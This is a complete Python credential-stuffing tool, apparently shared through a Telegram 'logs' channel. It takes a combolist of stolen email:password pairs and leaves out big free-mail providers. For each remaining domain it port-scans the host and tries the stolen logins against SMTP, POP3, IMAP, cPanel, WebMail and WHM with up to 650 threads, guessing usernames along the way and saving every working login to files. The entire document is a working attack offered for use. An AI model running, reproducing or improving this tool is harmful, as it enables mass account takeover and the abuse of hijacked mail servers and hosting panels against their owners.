import smtplib
import poplib
import imaplib
import ssl
import socket
import requests
import sys
import os
import threading
import urllib3
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

print_lock = Lock()
file_lock = Lock()

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

# ── thread-local request session (requests.Session is NOT thread-safe) ──
_thread_local = threading.local()

def get_session():
    """Return a per-thread requests.Session (safe for 650 threads)."""
    s = getattr(_thread_local, 'session', None)
    if s is None:
        s = requests.Session()
        s.verify = False
        s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
        _thread_local.session = s
    return s


# ─────────────────────────────────────────────
# Banner
# ─────────────────────────────────────────────
banner = f"""
{Fore.LIGHTMAGENTA_EX}
+.══════════════════════════════════════════════════════════════════════════════════════════════════════════.


                            𝐉𝐨𝐢𝐧 𝐜𝐡𝐚𝐧𝐧𝐞𝐥 𝐟𝐨𝐫 𝐟𝐫𝐞𝐞 𝐭𝐨𝐨𝐥𝐬 : https://t.me/AnnaQitty_Logs
                            𝗢𝘄𝗻𝗲𝗿  : t.me/Annaqitty


+.══════════════════════════════════════════════════════════════════════════════════════════════════════════.
{Style.RESET_ALL}
"""

contact_info = f"""
{Fore.LIGHTGREEN_EX + Style.BRIGHT}owner: {Fore.LIGHTWHITE_EX + Style.DIM}@AnnaQitty
{Fore.LIGHTGREEN_EX + Style.BRIGHT}Channel: {Fore.LIGHTWHITE_EX + Style.DIM}t.me/AnnaQitty_Logs
"""


# ─────────────────────────────────────────────
# Port categories
# ─────────────────────────────────────────────
SSL_PORTS = {
    465:  'SMTP_SSL',
    995:  'POP3_SSL',
    993:  'IMAP_SSL',
}

STARTTLS_PORTS = {
    25, 587, 588, 589, 1025, 2525,
    2553, 2560, 2565, 2570, 2580, 2595, 2600,
    2650, 2665, 2670, 2680, 2695, 2700,
    2750, 2765, 2770, 2780, 2795, 2800,
    2850, 2865, 2870, 2880, 2895, 2900,
    2950, 2965, 2970, 2980, 2995, 3000,
    3050, 3065, 3070, 3080, 3095, 3100,
    3150, 3165, 3170, 3180, 3195, 3200,
    3250, 3265, 3270, 3280, 3295, 3300,
    3350, 3365, 3370, 3380, 3395, 3400,
    3450, 3465, 3470, 3480, 3495, 3500,
    3550, 3565, 3570, 3580, 3595, 3600,
    3650, 3665, 3670, 3680, 3695, 3700,
    3750, 3765, 3770, 3780, 3795, 3800,
    3850, 3865, 3870, 3880, 3895, 3900,
    3950, 3965, 3970, 3980, 3995, 4000,
    26,
}

POP3_PLAIN_PORTS  = {110}
SSL_GENERIC_PORTS = {500, 502}
HTTPS_PORTS       = {443}
SKIP_SMTP_PORTS   = {3306}

ALL_PORTS = []
_seen = set()
for _group in (SSL_PORTS, STARTTLS_PORTS, POP3_PLAIN_PORTS,
               SSL_GENERIC_PORTS, HTTPS_PORTS, SKIP_SMTP_PORTS):
    for _p in sorted(_group):
        if _p not in _seen:
            _seen.add(_p)
            ALL_PORTS.append(_p)


# ─────────────────────────────────────────────
# Blacklist
# ─────────────────────────────────────────────
blacklisted_domains = frozenset({
    'gmail.com','googlemail.com','outlook.com','hotmail.com','live.com',
    'msn.com','yahoo.com','icloud.com','me.com','mac.com',
    'aol.com','aim.com','proton.me','protonmail.com','pm.me',
    'zoho.com','zohomail.com','fastmail.com','fastmail.fm',
    'tuta.com','tutanota.com','mail.com','email.com',
    'gmx.com','gmx.de','gmx.net','gmx.at','web.de','t-online.de',
    'freenet.de','mail.de','posteo.de',
    'orange.fr','wanadoo.fr','laposte.net','sfr.fr','free.fr',
    'neuf.fr','bbox.fr',
    'libero.it','virgilio.it','alice.it','tin.it','tim.it',
    'tiscali.it','fastwebnet.it',
    'telefonica.net','terra.es','terra.com.br','ono.com','ya.com',
    'movistar.es',
    'sapo.pt','netcabo.pt',
    'ziggo.nl','kpnmail.nl','planet.nl','hetnet.nl','home.nl',
    'telenet.be','skynet.be','proximus.be',
    'wp.pl','o2.pl','onet.pl','interia.pl','gazeta.pl',
    'seznam.cz','centrum.cz','email.cz','zoznam.sk','azet.sk',
    'mail.ru','inbox.ru','list.ru','bk.ru',
    'yandex.ru','yandex.com','ya.ru','rambler.ru',
    'ukr.net','i.ua','meta.ua','bigmir.net',
    'mynet.com',
    'uol.com.br','bol.com.br','ig.com.br','zipmail.com.br',
    'fibertel.com.ar','arnet.com.ar','speedy.com.ar',
    'prodigy.net.mx','telmexmail.com',
    'comcast.net','xfinity.com','att.net','sbcglobal.net',
    'bellsouth.net','pacbell.net','ameritech.net','swbell.net',
    'verizon.net','cox.net','charter.net','spectrum.net',
    'optonline.net','optimum.net','frontier.com','windstream.net',
    'centurylink.net','qwest.net','earthlink.net','juno.com',
    'netzero.net',
    'rogers.com','shaw.ca','bell.net','sympatico.ca','videotron.ca',
    'telus.net',
    'qq.com','foxmail.com','163.com','126.com','yeah.net',
    '188.com','139.com','189.cn','aliyun.com','mail.sina.com.cn',
    'sina.com','sohu.com',
    'yahoo.co.jp','docomo.ne.jp','ezweb.ne.jp','au.com',
    'i.softbank.jp','softbank.ne.jp',
    'naver.com','daum.net','hanmail.net','nate.com','kakao.com',
    'rediffmail.com','rediff.com','sify.com','indiatimes.com','in.com',
    'bigpond.com','bigpond.net.au','optusnet.com.au','iinet.net.au',
    'internode.on.net','tpg.com.au','westnet.com.au',
    'xtra.co.nz','clear.net.nz','vodafone.co.nz',
    'telkom.net','telkom.net.id','plasa.com','cbn.net.id',
    'indosat.net.id','centrin.net.id',
    'bluewin.ch','swissonline.ch','hispeed.ch','aon.at','chello.at',
    'telia.com','telia.se','bredband.net','spray.se',
    'online.no','start.no','telenor.no','tdc.dk','mail.dk',
    'elisa.fi','kolumbus.fi',
    'webmail.co.za','mweb.co.za','vodamail.co.za','telkomsa.net',
    'emirates.net.ae','etisalat.ae','du.ae',
    'walla.co.il','bezeqint.net','netvision.net.il',
    'mail.kz','mail.ua','mail.bg','abv.bg','dir.bg',
    'mail.ee','mail.lv','inbox.lv','mail.lt','one.lt',
    'mail.gr','otenet.gr','forthnet.gr','cytanet.com.cy',
    'mail.ro','rdslink.ro','home.ro',
    'mail.hu','freemail.hu','citromail.hu',
    'mail.hr','vip.hr','net.hr','mail.rs','eunet.rs',
    'mail.sk','tiscali.cz','atlas.cz',
    'mail.si','siol.net','volja.net',
    'mail.ba','bih.net.ba','mail.mk','on.net.mk',
    'mail.al','albaniaonline.net',
    'mail.md','moldova.net',
    'mail.ge','yahoo.ge','mail.am','mail.az','box.az',
    'mail.by','tut.by','mail.tm','mail.uz','mail.kg','mail.mn',
    'mail.np','nepalmail.com',
    'mail.lk','sltnet.lk','dialog.lk',
    'vsnl.com','yahoo.co.in','mail.pk','yahoo.com.pk',
    'hotmail.com.pk','mail.com.bd','yahoo.com.bd','bdmail.com',
    'yahoo.co.th','hotmail.co.th','sanook.com','mail.co.th',
    'yahoo.com.my','streamyx.com','tm.net.my',
    'yahoo.com.sg','singnet.com.sg','starhub.com','pacific.net.sg',
    'yahoo.com.ph','pldtdsl.net',
    'yahoo.co.id','telkomsel.co.id','indosat.net.id','xl.co.id',
    'myrepublic.co.id',
    'yahoo.com.vn','vnn.vn','fpt.vn','viettel.com.vn',
    'yahoo.co.kr',
    'yahoo.com.hk','netvigator.com','hkbn.net',
    'yahoo.com.tw','msa.hinet.net','seed.net.tw','kimo.com',
    'yahoo.co.nz','slingshot.co.nz',
    'yahoo.co.za',
    'yahoo.com.ng','ymail.com.ng','mail.com.ng',
    'yahoo.com.gh','yahoo.co.ke','yahoo.co.ug','yahoo.co.tz',
    'yahoo.co.zm','yahoo.co.zw',
    'mail.eg','yahoo.com.eg','link.net','tedata.net',
    'mail.ma','menara.ma','iam.ma',
    'yahoo.com.sa','hotmail.sa','mail.sa','stc.com.sa',
    'yahoo.ae',
    'yahoo.co.il',
    'yahoo.com.tr','hotmail.com.tr','mail.com.tr',
    'yahoo.com.ar','yahoo.com.br','yahoo.com.mx','yahoo.cl',
    'yahoo.com.pe','yahoo.com.co','yahoo.com.ve','yahoo.com.ec',
    'yahoo.com.bo','yahoo.com.py','yahoo.com.uy','yahoo.com.pa',
    'yahoo.com.gt','yahoo.com.do','yahoo.com.ni','yahoo.com.sv',
    'yahoo.hn','yahoo.cr','yahoo.com.pr',
    'terra.com.ar','terra.com.mx','terra.com.pe','terra.com.co',
    'r7.com','globomail.com','oi.com.br','tim.com.br',
    'claro.com.br','hotmail.com.br',
    'mailfence.com','hushmail.com','runbox.com','mailbox.org',
    'posteo.net','disroot.org','riseup.net','kolabnow.com',
    'inbox.com','mail2world.com','lycos.com','excite.com',
})


# ─────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────
def safe_print(msg):
    with print_lock:
        print(msg, flush=True)


def save_result(filename, data):
    try:
        with file_lock:
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(data + '\n')
    except OSError as e:
        safe_print(f"{Fore.LIGHTRED_EX}[ERROR] Write {filename}: {e}{Style.RESET_ALL}")


def extract_domain(email):
    try:
        d = email.split('@')[1].strip().lower()
        return d.split(':')[0].split('/')[0]
    except (IndexError, AttributeError):
        return ''


def is_blacklisted(domain):
    return (not domain) or (domain in blacklisted_domains)


def resolve_host(hostname):
    """
    Resolve hostname ONCE and return the IP string.
    Returns '' if DNS fails.
    """
    try:
        info = socket.getaddrinfo(hostname, None, socket.AF_INET)
        return info[0][4][0]
    except (socket.gaierror, OSError):
        return ''


def quick_socket_check(ip, port, timeout=1):
    """Fast TCP connect to a resolved IP. 1 s timeout."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        sock.close()
        return True
    except (socket.timeout, ConnectionRefusedError, ConnectionResetError,
            OSError):
        return False


def generate_usernames(domain, email):
    parts = domain.split('.')
    user1 = parts[0] if parts else domain
    user2 = domain.replace('.', '')
    user_email_part = email.split('@')[0].strip()
    candidates = list(dict.fromkeys([user1, user2, user_email_part]))
    if len(user1) > 8:
        candidates.append(user1[:8])
    return [u for u in candidates if u]


# ─────────────────────────────────────────────
# Protocol login attempts
# ─────────────────────────────────────────────
def try_smtp_plain(domain, port, email, password, timeout=10):
    try:
        s = smtplib.SMTP(domain, port, timeout=timeout)
        s.login(email, password)
        s.quit()
        return True
    except smtplib.SMTPAuthenticationError:
        return 'auth_fail'
    except Exception:
        return False


def try_smtp_starttls(domain, port, email, password, timeout=10):
    try:
        s = smtplib.SMTP(domain, port, timeout=timeout)
        s.starttls(context=ssl_ctx)
        s.login(email, password)
        s.quit()
        return True
    except smtplib.SMTPAuthenticationError:
        return 'auth_fail'
    except Exception:
        return False


def try_smtp_ssl(domain, port, email, password, timeout=10):
    try:
        s = smtplib.SMTP_SSL(domain, port, timeout=timeout, context=ssl_ctx)
        s.login(email, password)
        s.quit()
        return True
    except smtplib.SMTPAuthenticationError:
        return 'auth_fail'
    except Exception:
        return False


def try_pop3_plain(domain, port, email, password, timeout=10):
    try:
        p = poplib.POP3(domain, port, timeout=timeout)
        p.user(email)
        p.pass_(password)
        p.quit()
        return True
    except poplib.error_user:
        return 'auth_fail'
    except Exception:
        return False


def try_pop3_ssl(domain, port, email, password, timeout=10):
    try:
        p = poplib.POP3_SSL(domain, port, timeout=timeout, context=ssl_ctx)
        p.user(email)
        p.pass_(password)
        p.quit()
        return True
    except poplib.error_user:
        return 'auth_fail'
    except Exception:
        return False


def try_imap_ssl(domain, port, email, password, timeout=10):
    try:
        m = imaplib.IMAP4_SSL(domain, port, timeout=timeout, ssl_context=ssl_ctx)
        m.login(email, password)
        m.logout()
        return True
    except imaplib.IMAP4.error:
        return 'auth_fail'
    except Exception:
        return False


# ─────────────────────────────────────────────
# SMTP Checker  –  all ports, DNS resolved once
# ─────────────────────────────────────────────
def smtp_checker(credentials):
    try:
        email, password = credentials.split(':', 1)
    except ValueError:
        safe_print(f"{Fore.LIGHTRED_EX}[ERROR] Bad format: {credentials}{Style.RESET_ALL}")
        return

    domain = extract_domain(email)
    if is_blacklisted(domain):
        return

    # ── resolve DNS once ──
    ip = resolve_host(domain)
    if not ip:
        safe_print(f"{Fore.LIGHTYELLOW_EX}[DNS-FAIL] {domain}{Style.RESET_ALL}")
        return

    # ── quick port scan (1 s timeout each) ──
    open_ports = [p for p in ALL_PORTS if quick_socket_check(ip, p, timeout=1)]

    if not open_ports:
        return

    # ── try login on each open port ──
    for port in open_ports:

        if port in SKIP_SMTP_PORTS:
            save_result('OpenPorts.txt', f"{domain}|{port}")
            safe_print(f"{Fore.LIGHTYELLOW_EX}[OPEN] {domain}:{port} (non-mail){Style.RESET_ALL}")
            continue

        result     = None
        proto_name = None

        if port in SSL_PORTS:
            proto_name = SSL_PORTS[port]
            if proto_name == 'SMTP_SSL':
                result = try_smtp_ssl(domain, port, email, password)
            elif proto_name == 'POP3_SSL':
                result = try_pop3_ssl(domain, port, email, password)
            elif proto_name == 'IMAP_SSL':
                result = try_imap_ssl(domain, port, email, password)

        elif port in POP3_PLAIN_PORTS:
            proto_name = 'POP3'
            result     = try_pop3_plain(domain, port, email, password)

        elif port in STARTTLS_PORTS:
            proto_name = 'SMTP/TLS'
            result     = try_smtp_starttls(domain, port, email, password)
            if result is False:                       # STARTTLS not supported → plain
                result     = try_smtp_plain(domain, port, email, password)
                proto_name = 'SMTP'

        elif port in SSL_GENERIC_PORTS:
            proto_name = 'SSL'
            result     = try_smtp_ssl(domain, port, email, password)

        elif port in HTTPS_PORTS:
            proto_name = 'HTTPS'
            result     = try_smtp_ssl(domain, port, email, password)

        else:
            proto_name = 'SMTP'
            result     = try_smtp_plain(domain, port, email, password)

        if result is True:
            line = f"{domain}|{port}|{email}|{password}|{proto_name}"
            save_result('SMTPs.txt', line)
            safe_print(f"{Fore.LIGHTGREEN_EX}{line}  ---> [OK]{Style.RESET_ALL}")
            return

        if result == 'auth_fail':
            safe_print(f"{Fore.LIGHTYELLOW_EX}[AUTH-FAIL] {domain}:{port} ({proto_name}){Style.RESET_ALL}")
            return          # wrong password – stop

        # False → protocol mismatch / conn error → keep trying next port
        safe_print(f"{Fore.LIGHTYELLOW_EX}[SKIP] {domain}:{port} ({proto_name}){Style.RESET_ALL}")

    # ── no port gave a successful login ──


# ─────────────────────────────────────────────
# cPanel / WebMail / WHM
# ─────────────────────────────────────────────
def cpanel_checker(credentials):
    try:
        email, password = credentials.split(':', 1)
    except ValueError:
        return
    domain = extract_domain(email)
    if is_blacklisted(domain):
        return

    sess = get_session()
    for user in generate_usernames(domain, email):
        try:
            resp = sess.post(
                f'https://{domain}:2083/login/',
                data={'user': user, 'pass': password, 'login_submit': 'Log in'},
                timeout=15, allow_redirects=False,
            )
            if resp.status_code == 302 or 'lblDomainName' in resp.text:
                result = f'{domain}:2083|{user}|{password}'
                save_result('cPanels.txt', result)
                safe_print(f"{Fore.LIGHTBLUE_EX}{result}  ---> [cPanel]{Style.RESET_ALL}")
                return
        except (requests.ConnectionError, requests.Timeout, requests.exceptions.SSLError):
            safe_print(f"{Fore.LIGHTYELLOW_EX}[WARN] cPanel {domain}:2083 unreachable{Style.RESET_ALL}")
            return
        except Exception as e:
            safe_print(f"{Fore.LIGHTRED_EX}[ERROR] cPanel {domain}:2083 -> {e}{Style.RESET_ALL}")
            return


def webmail_checker(credentials):
    try:
        email, password = credentials.split(':', 1)
    except ValueError:
        return
    domain = extract_domain(email)
    if is_blacklisted(domain):
        return

    sess = get_session()
    for user in generate_usernames(domain, email):
        try:
            resp = sess.post(
                f'https://{domain}:2096/login/',
                data={'user': user, 'pass': password, 'login_submit': 'Log in'},
                timeout=15, allow_redirects=False,
            )
            if resp.status_code == 302 or 'id_autoresponders' in resp.text:
                result = f'{domain}:2096|{user}|{password}'
                save_result('WebMail.txt', result)
                safe_print(f"{Fore.LIGHTMAGENTA_EX}{result}  ---> [WebMail]{Style.RESET_ALL}")
                return
        except (requests.ConnectionError, requests.Timeout, requests.exceptions.SSLError):
            safe_print(f"{Fore.LIGHTYELLOW_EX}[WARN] WebMail {domain}:2096 unreachable{Style.RESET_ALL}")
            return
        except Exception as e:
            safe_print(f"{Fore.LIGHTRED_EX}[ERROR] WebMail {domain}:2096 -> {e}{Style.RESET_ALL}")
            return


def whm_checker(credentials):
    try:
        email, password = credentials.split(':', 1)
    except ValueError:
        return
    domain = extract_domain(email)
    if is_blacklisted(domain):
        return

    sess = get_session()
    for user in generate_usernames(domain, email):
        try:
            resp = sess.post(
                f'https://{domain}:2087/login/',
                data={'user': user, 'pass': password, 'login_submit': 'login'},
                timeout=15, allow_redirects=False,
            )
            if resp.status_code == 302 or 'whm_zone_manager' in resp.text:
                result = f'{domain}:2087|{user}|{password}'
                save_result('WHM.txt', result)
                safe_print(f"{Fore.LIGHTCYAN_EX}{result}  ---> [WHM]{Style.RESET_ALL}")
                return
        except (requests.ConnectionError, requests.Timeout, requests.exceptions.SSLError):
            safe_print(f"{Fore.LIGHTYELLOW_EX}[WARN] WHM {domain}:2087 unreachable{Style.RESET_ALL}")
            return
        except Exception as e:
            safe_print(f"{Fore.LIGHTRED_EX}[ERROR] WHM {domain}:2087 -> {e}{Style.RESET_ALL}")
            return


# ─────────────────────────────────────────────
# Dispatcher
# ─────────────────────────────────────────────
def run_checks(credentials, use_smtp, use_cpanel, use_webmail, use_whm):
    if use_smtp:
        smtp_checker(credentials)
    if use_cpanel:
        cpanel_checker(credentials)
    if use_webmail:
        webmail_checker(credentials)
    if use_whm:
        whm_checker(credentials)


# ─────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────
MAX_THREADS = 650

def main():
    print(banner)
    print(contact_info)

    combolist_file = input(f"{Fore.LIGHTCYAN_EX}[INPUT] Path to combolist (.txt): ").strip()

    if not os.path.isfile(combolist_file):
        safe_print(f"{Fore.LIGHTRED_EX}[ERROR] File not found: {combolist_file}{Style.RESET_ALL}")
        input("Press Enter to exit...")
        return

    while True:
        try:
            raw = input(f"{Fore.LIGHTCYAN_EX}[INPUT] Number of threads [1-{MAX_THREADS}]: ").strip() or "20"
            threads = int(raw)
            if 1 <= threads <= MAX_THREADS:
                break
            safe_print(f"{Fore.LIGHTYELLOW_EX}[!] Must be 1-{MAX_THREADS}{Style.RESET_ALL}")
        except ValueError:
            safe_print(f"{Fore.LIGHTYELLOW_EX}[!] Enter a valid number{Style.RESET_ALL}")

    print(f"\n{Fore.LIGHTCYAN_EX}  Checkers:")
    print(f"    1) SMTP   ({len(ALL_PORTS)} ports)")
    print(f"    2) cPanel")
    print(f"    3) WebMail")
    print(f"    4) WHM")
    print(f"    A) All")
    choice = input(f"{Fore.LIGHTCYAN_EX}[INPUT] Select (comma-separated, default A): ").strip() or 'A'

    choices = {c.strip().upper() for c in choice.split(',')}

    if 'A' in choices:
        use_smtp = use_cpanel = use_webmail = use_whm = True
    else:
        use_smtp    = '1' in choices
        use_cpanel  = '2' in choices
        use_webmail = '3' in choices
        use_whm     = '4' in choices

    if not (use_smtp or use_cpanel or use_webmail or use_whm):
        safe_print(f"{Fore.LIGHTRED_EX}[ERROR] No valid checker selected{Style.RESET_ALL}")
        input("Press Enter to exit...")
        return

    safe_print(f"{Fore.LIGHTCYAN_EX}[INFO] Loading {combolist_file} ...{Style.RESET_ALL}")
    with open(combolist_file, 'r', encoding='utf-8', errors='ignore') as f:
        credentials_list = [line.strip() for line in f if ':' in line and '@' in line]

    total = len(credentials_list)
    if total == 0:
        safe_print(f"{Fore.LIGHTRED_EX}[ERROR] No valid credentials found{Style.RESET_ALL}")
        input("Press Enter to exit...")
        return

    active = []
    if use_smtp:    active.append(f"SMTP ({len(ALL_PORTS)} ports)")
    if use_cpanel:  active.append("cPanel")
    if use_webmail: active.append("WebMail")
    if use_whm:     active.append("WHM")

    print(f"\n{Fore.LIGHTCYAN_EX}{'=' * 55}{Style.RESET_ALL}")
    print(f"{Fore.LIGHTCYAN_EX}  Credentials : {total}{Style.RESET_ALL}")
    print(f"{Fore.LIGHTCYAN_EX}  Threads     : {threads}{Style.RESET_ALL}")
    print(f"{Fore.LIGHTCYAN_EX}  Checkers    : {', '.join(active)}{Style.RESET_ALL}")
    print(f"{Fore.LIGHTCYAN_EX}{'=' * 55}{Style.RESET_ALL}\n")

    done = 0
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(run_checks, c, use_smtp, use_cpanel, use_webmail, use_whm): c
            for c in credentials_list
        }

        for future in as_completed(futures):
            done += 1
            try:
                future.result(timeout=900)   # 15 min hard cap per credential
            except TimeoutError:
                safe_print(f"{Fore.LIGHTYELLOW_EX}[TIMEOUT] {futures[future]}{Style.RESET_ALL}")
            except Exception as e:
                safe_print(f"{Fore.LIGHTRED_EX}[ERROR] {futures[future]}: {e}{Style.RESET_ALL}")

            step = max(1, total // 50)       # print every ~2 %
            if done % step == 0 or done == total:
                safe_print(f"{Fore.LIGHTWHITE_EX}[PROGRESS] {done}/{total}{Style.RESET_ALL}")

    print(f"\n{Fore.LIGHTGREEN_EX}[DONE] {total} credentials processed.{Style.RESET_ALL}\n")

    for fname in ('SMTPs.txt', 'cPanels.txt', 'WebMail.txt', 'WHM.txt', 'OpenPorts.txt'):
        if os.path.isfile(fname):
            with open(fname, 'r', encoding='utf-8', errors='ignore') as f:
                cnt = sum(1 for _ in f)
            safe_print(f"  {Fore.LIGHTGREEN_EX}{fname}: {cnt}{Style.RESET_ALL}")
        else:
            safe_print(f"  {Fore.LIGHTYELLOW_EX}{fname}: 0{Style.RESET_ALL}")

    input("\nPress Enter to exit...")


if __name__ == '__main__':
    main()
